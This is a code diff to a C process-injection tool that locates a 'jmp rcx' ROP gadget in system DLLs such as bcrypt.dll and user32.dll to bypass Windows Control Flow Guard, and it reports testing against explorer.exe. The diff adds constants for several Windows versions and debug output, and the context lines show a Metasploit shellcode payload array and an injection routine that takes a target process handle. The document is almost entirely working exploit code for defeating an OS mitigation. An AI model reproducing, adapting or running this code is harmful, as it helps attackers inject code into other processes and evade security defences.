@@ -3,8 +3,6 @@
 * Found a gadget in bcrypt.dll that can bypass CFG.
 * Theoretically all processes which have bcrypt.dll
 * can be targeted.
-* 
-* Tested on windows 1809, explorer.exe.
 *
 */
 
@@ -27,8 +25,58 @@
 #define _INT
 #endif
 
-// this is the last bit of the gadget's address
-#define ROP_BIT 0x3
+// pick windows version
+// lazy, didn't bother getting the version in code
+
+// Win 1809
+//\
+#define _WIN_1809
+
+// Win 1909
+//\
+#define _WIN_1909
+
+// Win 21H1
+//\
+#define _WIN_21H1
+
+// Win 22H2
+//
+#define _WIN_22H2
+
+// Win 11
+//\
+#define _WIN_11_22H2
+
+#ifdef _WIN_1809
+#define ROP_RANGE 0x1000 * 100
+#define ROP_DLL "bcrypt.dll"
+#define ROP_BIT 0x3					// this is the last bit of the gadget's address
+#endif
+
+#ifdef _WIN_1909
+#define ROP_RANGE 0x1000 * 100
+#define ROP_DLL "bcryptprimitives.dll"
+#define ROP_BIT 0x0
+#endif
+
+#ifdef _WIN_21H1
+#define ROP_RANGE 0x1000 * 30
+#define ROP_DLL "user32.dll"
+#define ROP_BIT 0x0
+#endif
+
+#ifdef _WIN_22H2
+#define ROP_RANGE 0x1000 * 30
+#define ROP_DLL "user32.dll"
+#define ROP_BIT 0x0
+#endif
+
+#ifdef _WIN_11_22H2
+#define ROP_RANGE 0x1000 * 30
+#define ROP_DLL "bcrypt.dll"
+#define ROP_BIT 0x0
+#endif
 
 //x64 calc metasploit shellcode 
 unsigned char payload[] = {
@@ -138,6 +186,7 @@ BOOL RopCfgFree(_In_ HANDLE hProc, _In_ PVOID pAddr, _In_ LPWSTR szProcessName)
 	PVOID pLegitBase = NULL;
 	PVOID rop = NULL;
 	PVOID tmp = NULL;
+	//PVOID lpParam = NULL;	// compile according to windows version
 	PVOID hModBase = NULL;
 	DWORD dwThrdId = 0x0;
 	HANDLE hThrd = INVALID_HANDLE_VALUE;
@@ -146,7 +195,7 @@ BOOL RopCfgFree(_In_ HANDLE hProc, _In_ PVOID pAddr, _In_ LPWSTR szProcessName)
 	DWORD cbNeeded = 0x0;
 
 	// find a legit image to rop, get base address
-	pLegitBase = (PVOID)LoadLibraryA("bcrypt.dll");
+	pLegitBase = (PVOID)LoadLibraryA(ROP_DLL);
 
 	if (NULL == pLegitBase)
 	{
@@ -154,15 +203,14 @@ BOOL RopCfgFree(_In_ HANDLE hProc, _In_ PVOID pAddr, _In_ LPWSTR szProcessName)
 		return FALSE;
 	}
 
-	for (DWORD i = 0; i + 1 < 0x1000 * 100 && rop == NULL; i++)
+	for (DWORD i = 0; i + 1 < ROP_RANGE && rop == NULL; i++)
 	{
 		if (((PCHAR)pLegitBase)[i] == '\xff' && ((PCHAR)pLegitBase)[i + 1] == '\xe1')
 		{
 			tmp = (PVOID)((PCHAR)pLegitBase + i);
+			DEBUG_PRINT("[*]************: 0x%p\n", tmp);
+			DEBUG_PRINT("[*]************: %x\n", (ULONG_PTR)tmp & 0xF);
 		}
-        // original idea here is to find a gadget whose last bit address is not very
-        // far away from 0x0, since SetProcessValidCallTargets only works on aligned
-        // address, feel free to assign rop directly since only one gadget in bcrypt
 		DWORD delta = (ULONG_PTR)tmp & 0xF;
 		if (delta == ROP_BIT)
 			rop = tmp;
@@ -192,8 +240,8 @@ BOOL RopCfgFree(_In_ HANDLE hProc, _In_ PVOID pAddr, _In_ LPWSTR szProcessName)
 
 	VirtualQuery(rop, &mbi, sizeof(mbi));
 
-	DEBUG_PRINT("[*]Second allocation base @ =========> 0x%p\n", mbi.AllocationBase);
-	DEBUG_PRINT("[*]Second region size %d\n", mbi.RegionSize);
+	DEBUG_PRINT("[*]DLL allocation base @ =========> 0x%p\n", mbi.AllocationBase);
+	DEBUG_PRINT("[*]DLL region size %d\n", mbi.RegionSize);
 
 	CFG_CALL_TARGET_INFO callTargets[1] = { 0x0 };
 
